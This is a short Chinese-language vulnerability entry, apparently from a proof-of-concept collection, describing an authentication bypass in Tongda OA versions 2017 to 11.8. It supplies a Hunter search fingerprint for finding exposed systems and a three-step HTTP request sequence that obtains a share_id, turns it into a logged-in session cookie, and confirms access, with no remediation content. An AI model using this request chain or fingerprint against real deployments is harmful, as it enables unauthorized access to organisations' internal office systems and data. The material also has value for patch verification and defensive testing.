# 通达OAshare身份认证绕过漏洞

- **系统**：通达OA　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`hunter：`app.name="通达 OA"``
- **请求**：`GET /share/handle.php?module=2&module_id=1 HTTP/1.1`

**请求体 / payload**
```
1. 获取`share_id`
Host: 192.168.31.164
2. 使用上一步获取的share\_id,获取cookie,当响应为302时代表存在漏洞
GET /share/index.php?share_id=AD2E81D9-11E8-B2FF-61B9-28D25E2D4DCE HTTP/1.1
Host: 192.168.31.164
3. 使用上一步获取的cookie，验证是否成功登录
GET /general/golog.php?version=ie6 HTTP/1.1
Cookie: PHPSESSID=9ud7cua7ol90pq1gi9ehtri2g3; path=/
Host: 192.168.31.164
general/index.php?isIE=0&modify_pwd=0
```

**其他**
- 通达OA share身份认证绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2017-通达OA11.8